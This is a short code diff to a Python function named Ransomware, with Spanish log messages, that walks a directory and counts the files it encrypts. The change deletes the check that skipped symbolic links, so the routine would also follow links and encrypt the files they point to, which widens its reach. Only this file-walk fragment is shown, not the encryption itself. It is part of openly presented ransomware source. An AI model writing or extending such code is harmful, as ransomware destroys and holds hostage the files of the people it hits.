@@ -325,9 +325,6 @@ def Ransomware(directory_path, client):
 
             path = os.path.join(root, name)
 
-            if os.path.islink(path):
-                logger.debug(f"Omitido (symlink): {path}")
-                continue
             if not os.path.isfile(path):
                 logger.debug(f"Omitido (no es archivo): {path}")
                 continue
@@ -365,5 +362,6 @@ def Ransomware(directory_path, client):
 
     logger.info(f"Proceso completado. Total archivos cifrados: {count}")
     return count
+
 
 
